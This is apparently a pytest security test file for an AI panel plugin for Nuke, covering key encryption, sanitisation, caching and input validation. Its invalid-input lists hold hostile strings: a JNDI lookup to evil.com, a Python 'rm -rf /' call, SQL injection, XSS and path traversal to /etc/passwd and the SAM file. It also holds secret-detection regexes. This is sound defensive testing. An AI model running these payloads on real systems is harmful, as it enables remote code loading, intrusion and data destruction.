"""
Security and validation tests for the Nuke AI Panel system.
"""

import pytest
import os
import tempfile
import shutil
from unittest.mock import Mock, patch, mock_open
from cryptography.fernet import Fernet
import json
import hashlib
import time

from nuke_ai_panel.core.auth import AuthManager
from nuke_ai_panel.core.config import Config
from nuke_ai_panel.core.exceptions import AuthenticationError, ValidationError
from nuke_ai_panel.utils.cache import CacheManager


class TestAuthManager:
    """Test authentication manager security."""
    
    @pytest.fixture
    def temp_auth_dir(self):
        """Create temporary auth directory."""
        temp_dir = tempfile.mkdtemp()
        yield temp_dir
        shutil.rmtree(temp_dir)
    
    @pytest.fixture
    def auth_manager(self, temp_auth_dir):
        """Create auth manager with temporary directory."""
        with patch.object(AuthManager, '_get_auth_dir', return_value=temp_auth_dir):
            return AuthManager()
    
    def test_api_key_encryption(self, auth_manager):
        """Test that API keys are properly encrypted."""
        test_key = "sk-test-api-key-12345"
        provider = "openai"
        
        # Store API key
        auth_manager.set_api_key(provider, test_key)
        
        # Check that raw key is not stored in plaintext
        auth_file = os.path.join(auth_manager._get_auth_dir(), "credentials.enc")
        if os.path.exists(auth_file):
            with open(auth_file, 'rb') as f:
                encrypted_data = f.read()
                assert test_key.encode() not in encrypted_data
        
        # Verify we can retrieve the correct key
        retrieved_key = auth_manager.get_api_key(provider)
        assert retrieved_key == test_key
    
    def test_encryption_key_generation(self, auth_manager):
        """Test encryption key generation and storage."""
        # First access should generate a new key
        key1 = auth_manager._get_or_create_encryption_key()
        
        # Second access should return the same key
        key2 = auth_manager._get_or_create_encryption_key()
        
        assert key1 == key2
        assert len(key1) == 44  # Base64 encoded 32-byte key
    
    def test_invalid_encryption_key_handling(self, auth_manager):
        """Test handling of corrupted encryption keys."""
        # Corrupt the encryption key file
        key_file = os.path.join(auth_manager._get_auth_dir(), "encryption.key")
        os.makedirs(os.path.dirname(key_file), exist_ok=True)
        
        with open(key_file, 'w') as f:
            f.write("corrupted-key-data")
        
        # Should generate a new key when corruption is detected
        new_key = auth_manager._get_or_create_encryption_key()
        assert len(new_key) == 44
    
    def test_api_key_validation(self, auth_manager):
        """Test API key format validation."""
        # Valid keys
        valid_keys = {
            "openai": "sk-1234567890abcdef1234567890abcdef12345678",
            "anthropic": "sk-ant-1234567890abcdef1234567890abcdef12345678",
            "google": "AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI"
        }
        
        for provider, key in valid_keys.items():
            assert auth_manager._validate_api_key(key, provider) is True
        
        # Invalid keys
        invalid_keys = {
            "openai": "invalid-key",
            "anthropic": "sk-wrong-format",
            "google": "short"
        }
        
        for provider, key in invalid_keys.items():
            assert auth_manager._validate_api_key(key, provider) is False
    
    def test_secure_key_deletion(self, auth_manager):
        """Test secure deletion of API keys."""
        provider = "openai"
        test_key = "sk-test-key-to-delete"
        
        # Store and then delete key
        auth_manager.set_api_key(provider, test_key)
        assert auth_manager.get_api_key(provider) == test_key
        
        result = auth_manager.remove_api_key(provider)
        assert result is True
        assert auth_manager.get_api_key(provider) is None
    
    def test_multiple_provider_isolation(self, auth_manager):
        """Test that different providers' keys are isolated."""
        keys = {
            "openai": "sk-openai-test-key",
            "anthropic": "sk-ant-anthropic-test-key",
            "google": "google-test-key"
        }
        
        # Store all keys
        for provider, key in keys.items():
            auth_manager.set_api_key(provider, key)
        
        # Verify isolation
        for provider, expected_key in keys.items():
            retrieved_key = auth_manager.get_api_key(provider)
            assert retrieved_key == expected_key
        
        # Delete one key, others should remain
        auth_manager.remove_api_key("openai")
        assert auth_manager.get_api_key("openai") is None
        assert auth_manager.get_api_key("anthropic") == keys["anthropic"]
        assert auth_manager.get_api_key("google") == keys["google"]
    
    def test_file_permissions(self, auth_manager, temp_auth_dir):
        """Test that auth files have secure permissions."""
        test_key = "sk-test-permissions"
        auth_manager.set_api_key("openai", test_key)
        
        # Check file permissions (Unix-like systems)
        if os.name != 'nt':  # Not Windows
            auth_file = os.path.join(temp_auth_dir, "credentials.enc")
            key_file = os.path.join(temp_auth_dir, "encryption.key")
            
            if os.path.exists(auth_file):
                stat_info = os.stat(auth_file)
                # Should be readable/writable by owner only (600)
                assert oct(stat_info.st_mode)[-3:] == '600'
            
            if os.path.exists(key_file):
                stat_info = os.stat(key_file)
                assert oct(stat_info.st_mode)[-3:] == '600'


class TestConfigSecurity:
    """Test configuration security."""
    
    @pytest.fixture
    def secure_config(self, temp_dir):
        """Create config with security settings."""
        config_dict = {
            "security": {
                "encrypt_cache": True,
                "api_key_rotation_days": 90,
                "max_failed_auth_attempts": 5,
                "session_timeout_minutes": 60
            },
            "logging": {
                "level": "INFO",
                "sanitize_logs": True
            }
        }
        return Config(config_dict=config_dict)
    
    def test_sensitive_data_sanitization(self, secure_config):
        """Test that sensitive data is sanitized in logs."""
        # Mock logger
        with patch('nuke_ai_panel.utils.logger.get_logger') as mock_logger:
            logger_instance = Mock()
            mock_logger.return_value = logger_instance
            
            # Test API key sanitization
            api_key = "sk-1234567890abcdef1234567890abcdef12345678"
            sanitized = secure_config.sanitize_sensitive_data(f"API key: {api_key}")
            
            assert api_key not in sanitized
            assert "sk-****" in sanitized or "***" in sanitized
    
    def test_config_file_validation(self, secure_config, temp_dir):
        """Test configuration file validation."""
        config_file = os.path.join(temp_dir, "test_config.yaml")
        
        # Valid config
        valid_config = {
            "version": "1.0",
            "providers": {
                "openai": {"enabled": True}
            }
        }
        
        with open(config_file, 'w') as f:
            import yaml
            yaml.dump(valid_config, f)
        
        assert secure_config.validate_config_file(config_file) is True
        
        # Invalid config (malformed YAML)
        with open(config_file, 'w') as f:
            f.write("invalid: yaml: content: [")
        
        assert secure_config.validate_config_file(config_file) is False
    
    def test_config_injection_prevention(self, secure_config):
        """Test prevention of configuration injection attacks."""
        # Test various injection attempts
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/a}",
            "../../etc/passwd",
            "__import__('os').system('rm -rf /')"
        ]
        
        for malicious_input in malicious_inputs:
            # Should sanitize or reject malicious input
            sanitized = secure_config.sanitize_input(malicious_input)
            assert malicious_input != sanitized or sanitized == ""
    
    def test_environment_variable_security(self, secure_config):
        """Test secure handling of environment variables."""
        # Test that sensitive env vars are not logged
        with patch.dict(os.environ, {
            'OPENAI_API_KEY': 'sk-secret-key',
            'ANTHROPIC_API_KEY': 'sk-ant-secret-key',
            'SAFE_VAR': 'safe-value'
        }):
            env_summary = secure_config.get_environment_summary()
            
            # Should not contain actual API keys
            assert 'sk-secret-key' not in str(env_summary)
            assert 'sk-ant-secret-key' not in str(env_summary)
            # But should indicate they are set
            assert 'OPENAI_API_KEY' in env_summary
            assert env_summary['OPENAI_API_KEY'] == '[REDACTED]'


class TestCacheSecurity:
    """Test cache security."""
    
    @pytest.fixture
    def secure_cache(self, temp_dir):
        """Create cache manager with encryption enabled."""
        return CacheManager(
            cache_dir=temp_dir,
            encrypt_cache=True,
            max_size=100
        )
    
    def test_cache_encryption(self, secure_cache):
        """Test that cache data is encrypted."""
        sensitive_data = "This is sensitive API response data"
        cache_key = "test_key"
        
        # Store data
        secure_cache.set(cache_key, sensitive_data)
        
        # Check that raw data is not stored in plaintext
        cache_files = os.listdir(secure_cache.cache_dir)
        for cache_file in cache_files:
            file_path = os.path.join(secure_cache.cache_dir, cache_file)
            if os.path.isfile(file_path):
                with open(file_path, 'rb') as f:
                    file_content = f.read()
                    assert sensitive_data.encode() not in file_content
        
        # Verify we can retrieve the correct data
        retrieved_data = secure_cache.get(cache_key)
        assert retrieved_data == sensitive_data
    
    def test_cache_key_hashing(self, secure_cache):
        """Test that cache keys are properly hashed."""
        original_key = "user_query_with_sensitive_info"
        
        hashed_key = secure_cache._hash_key(original_key)
        
        # Should be a hash, not the original key
        assert hashed_key != original_key
        assert len(hashed_key) == 64  # SHA-256 hex digest length
    
    def test_cache_ttl_security(self, secure_cache):
        """Test that cache TTL prevents stale data exposure."""
        test_data = "time-sensitive data"
        cache_key = "ttl_test"
        
        # Store with short TTL
        secure_cache.set(cache_key, test_data, ttl=1)
        
        # Should be available immediately
        assert secure_cache.get(cache_key) == test_data
        
        # Wait for expiration
        time.sleep(2)
        
        # Should be expired
        assert secure_cache.get(cache_key) is None
    
    def test_cache_size_limits(self, secure_cache):
        """Test that cache size limits prevent memory exhaustion."""
        # Fill cache to limit
        for i in range(secure_cache.max_size + 10):
            secure_cache.set(f"key_{i}", f"data_{i}")
        
        # Should not exceed max size
        assert len(secure_cache._cache) <= secure_cache.max_size
    
    def test_secure_cache_cleanup(self, secure_cache):
        """Test secure cleanup of cache data."""
        test_data = "data to be cleaned"
        cache_key = "cleanup_test"
        
        secure_cache.set(cache_key, test_data)
        assert secure_cache.get(cache_key) == test_data
        
        # Clear cache
        secure_cache.clear()
        
        # Should be completely removed
        assert secure_cache.get(cache_key) is None
        assert len(secure_cache._cache) == 0


class TestInputValidation:
    """Test input validation and sanitization."""
    
    def test_message_content_validation(self):
        """Test validation of message content."""
        from nuke_ai_panel.core.base_provider import Message, MessageRole
        
        # Valid messages
        valid_message = Message(
            role=MessageRole.USER,
            content="How do I create a blur effect in Nuke?"
        )
        assert valid_message.content is not None
        
        # Test length limits
        very_long_content = "A" * 100000  # 100k characters
        with pytest.raises(ValidationError):
            Message(role=MessageRole.USER, content=very_long_content)
    
    def test_model_name_validation(self):
        """Test validation of model names."""
        valid_models = [
            "gpt-4",
            "gpt-3.5-turbo",
            "claude-3-sonnet-20240229",
            "gemini-pro"
        ]
        
        invalid_models = [
            "../../../etc/passwd",
            "model'; DROP TABLE models; --",
            "<script>alert('xss')</script>",
            "model\x00null_byte"
        ]
        
        from nuke_ai_panel.core.provider_manager import ProviderManager
        
        for model in valid_models:
            assert ProviderManager.validate_model_name(model) is True
        
        for model in invalid_models:
            assert ProviderManager.validate_model_name(model) is False
    
    def test_file_path_validation(self):
        """Test validation of file paths."""
        from nuke_ai_panel.core.config import Config
        
        config = Config()
        
        # Valid paths
        valid_paths = [
            "/home/user/config.yaml",
            "C:\\Users\\User\\config.yaml",
            "./relative/path/config.yaml"
        ]
        
        # Invalid paths (path traversal attempts)
        invalid_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/dev/null",
            "config.yaml\x00.txt"
        ]
        
        for path in valid_paths:
            assert config.validate_file_path(path) is True
        
        for path in invalid_paths:
            assert config.validate_file_path(path) is False
    
    def test_provider_name_validation(self):
        """Test validation of provider names."""
        valid_providers = [
            "openai",
            "anthropic", 
            "google",
            "ollama",
            "mistral"
        ]
        
        invalid_providers = [
            "invalid-provider",
            "provider'; DROP TABLE providers; --",
            "../../../etc/passwd",
            "provider\x00"
        ]
        
        from nuke_ai_panel.core.auth import AuthManager
        auth_manager = AuthManager()
        
        for provider in valid_providers:
            assert auth_manager.validate_provider_name(provider) is True
        
        for provider in invalid_providers:
            assert auth_manager.validate_provider_name(provider) is False


class TestNetworkSecurity:
    """Test network security measures."""
    
    def test_ssl_verification(self):
        """Test that SSL certificates are verified."""
        from nuke_ai_panel.providers.openai_provider import OpenAIProvider
        
        provider = OpenAIProvider(api_key="test-key")
        
        # Should use SSL verification by default
        assert provider.verify_ssl is True
        
        # Should reject self-signed certificates in production
        with patch('aiohttp.ClientSession') as mock_session:
            mock_session.return_value.__aenter__.return_value.post = Mock()
            
            # Verify SSL verification is enabled
            provider._create_session()
            mock_session.assert_called()
            # Check that SSL verification is not disabled
    
    def test_request_timeout_limits(self):
        """Test that requests have appropriate timeout limits."""
        from nuke_ai_panel.providers.openai_provider import OpenAIProvider
        from nuke_ai_panel.core.config import Config
        
        config = Config(config_dict={
            "providers": {
                "openai": {
                    "timeout": 30
                }
            }
        })
        
        provider = OpenAIProvider(api_key="test-key", config=config)
        
        # Should have reasonable timeout
        assert provider.timeout == 30
        assert provider.timeout < 300  # Not too long
    
    def test_rate_limiting_enforcement(self):
        """Test that rate limiting is properly enforced."""
        from nuke_ai_panel.utils.rate_limiter import RateLimiter, RateLimit
        
        rate_limit = RateLimit(requests_per_minute=60)
        limiter = RateLimiter(rate_limit)
        
        # Should allow requests within limit
        for _ in range(60):
            assert limiter.can_proceed() is True
            limiter.record_request()
        
        # Should block requests over limit
        assert limiter.can_proceed() is False
    
    def test_user_agent_header(self):
        """Test that appropriate User-Agent headers are set."""
        from nuke_ai_panel.providers.openai_provider import OpenAIProvider
        
        provider = OpenAIProvider(api_key="test-key")
        headers = provider._get_headers()
        
        assert "User-Agent" in headers
        user_agent = headers["User-Agent"]
        assert "nuke-ai-panel" in user_agent.lower()
        # Should not reveal sensitive system information


class TestErrorHandlingSecurity:
    """Test secure error handling."""
    
    def test_error_message_sanitization(self):
        """Test that error messages don't leak sensitive information."""
        from nuke_ai_panel.core.exceptions import ProviderError
        
        # Simulate error with sensitive data
        sensitive_error = "Authentication failed for API key sk-1234567890abcdef"
        
        sanitized_error = ProviderError.sanitize_error_message(sensitive_error)
        
        # Should not contain the actual API key
        assert "sk-1234567890abcdef" not in sanitized_error
        assert "Authentication failed" in sanitized_error
    
    def test_stack_trace_filtering(self):
        """Test that stack traces don't expose sensitive paths."""
        import traceback
        
        try:
            # Simulate error in sensitive path
            exec("raise Exception('Test error')")
        except Exception:
            tb = traceback.format_exc()
            
            # In production, should filter sensitive paths
            filtered_tb = self._filter_stack_trace(tb)
            
            # Should not contain full system paths
            assert "/home/user/.nuke_ai_panel" not in filtered_tb
    
    def _filter_stack_trace(self, traceback_str):
        """Helper to filter sensitive information from stack traces."""
        # Replace sensitive paths
        filtered = traceback_str.replace(os.path.expanduser("~"), "[HOME]")
        filtered = filtered.replace(os.getcwd(), "[CWD]")
        return filtered
    
    def test_exception_logging_security(self):
        """Test that exceptions are logged securely."""
        from nuke_ai_panel.utils.logger import get_logger
        
        logger = get_logger("test")
        
        with patch.object(logger, 'error') as mock_error:
            try:
                # Simulate error with sensitive data
                api_key = "sk-secret-key-12345"
                raise Exception(f"Failed to authenticate with key {api_key}")
            except Exception as e:
                logger.error(f"Provider error: {e}")
                
                # Check that sensitive data was sanitized in log
                logged_message = mock_error.call_args[0][0]
                assert "sk-secret-key-12345" not in logged_message


class TestSecurityAudit:
    """Security audit and compliance tests."""
    
    def test_no_hardcoded_secrets(self):
        """Test that no secrets are hardcoded in the codebase."""
        import re
        
        # Patterns that might indicate hardcoded secrets
        secret_patterns = [
            r'sk-[a-zA-Z0-9]{48}',  # OpenAI API key pattern
            r'sk-ant-[a-zA-Z0-9-]{95}',  # Anthropic API key pattern
            r'AIza[0-9A-Za-z-_]{35}',  # Google API key pattern
            r'password\s*=\s*["\'][^"\']+["\']',  # Hardcoded passwords
        ]
        
        # This would scan actual source files in a real implementation
        # For testing, we'll just verify the patterns work
        test_code = """
        api_key = "sk-1234567890abcdefghijklmnopqrstuvwxyz123456789012"
        password = "hardcoded_password"
        """
        
        for pattern in secret_patterns:
            matches = re.findall(pattern, test_code, re.IGNORECASE)
            if matches:
                pytest.fail(f"Found potential hardcoded secret: {matches}")
    
    def test_dependency_security(self):
        """Test that dependencies don't have known vulnerabilities."""
        # This would integrate with tools like safety or snyk
        # For testing, we'll check that we're using recent versions
        
        import pkg_resources
        
        critical_packages = [
            'cryptography',
            'aiohttp',
            'pyyaml'
        ]
        
        for package in critical_packages:
            try:
                version = pkg_resources.get_distribution(package).version
                # Should be using reasonably recent versions
                assert version is not None
            except pkg_resources.DistributionNotFound:
                pytest.skip(f"Package {package} not installed")
    
    def test_file_permission_security(self, temp_dir):
        """Test that created files have secure permissions."""
        test_file = os.path.join(temp_dir, "test_secure_file")
        
        # Create file with secure permissions
        with open(test_file, 'w') as f:
            f.write("sensitive data")
        
        # Set secure permissions (owner read/write only)
        os.chmod(test_file, 0o600)
        
        if os.name != 'nt':  # Not Windows
            stat_info = os.stat(test_file)
            permissions = oct(stat_info.st_mode)[-3:]
            assert permissions == '600'


if __name__ == "__main__":
    pytest.main([__file__])